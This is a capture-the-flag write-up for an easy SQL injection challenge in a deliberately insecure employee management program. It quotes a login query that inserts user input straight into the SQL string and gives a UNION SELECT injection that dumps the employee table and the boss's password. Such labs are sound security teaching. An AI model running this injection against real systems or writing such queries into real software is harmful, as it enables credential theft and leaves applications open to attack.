# Employee Interface CTF Writeup

## Challenge Information
Link: https://github.com/js656618/CTF_PROJECT
Difficulty: easy
Category/Categories: SQL Injection, Exploitation
Author(s): Justin Spires

## Description
You’ve discovered an insecure employee management system where employees can log in, view their records, and create new employees. However, the company has left hints of SQL vulnerabilities in their code. 

Your objective is to uncover the boss's password stored in the database. Use your knowledge of SQL injection to extract it and gain access as the boss!

## Hint(s):
- Review the login function in employee_interface.py.
- Think about how SQL injection might help you retrieve data from the database.
- The employee table contains the boss's information, including their password.

## Solution

### Step 1: Analyze the Provided Code
The `employee_interface.py` includes the following code for validating login:
query = f"SELECT * FROM employee WHERE employee_id = '{employee_id}' AND password = '{password}'"
This query is vulnerable to SQL injection because user inputs (`employee_id` and `password`) are inserted directly into the query string.

### Step 2: Perform SQL Injection
In the login menu:
1. Enter the following **Employee ID**:
    ' UNION SELECT * FROM employee --
   This SQL injection breaks out of the query logic and retrieves all data from the `employee` table.

2. For the password, enter any string (e.g., `password`), as it is ignored by the injection.

### Step 3: Extract the Boss's Password
The program will output the data retrieved from the database, including the boss's credentials:
('jj000000', 'John Jerkman', '555-1234', '123 Corporate Blvd', 'Iamtheboss20', None, 300000)

### Step 4: Log in as the Boss
Use the boss's credentials to log in:
- **Employee ID**: jj000000
- **Password**: Iamtheboss20

Upon successful login, you’ll see the boss's welcome message.

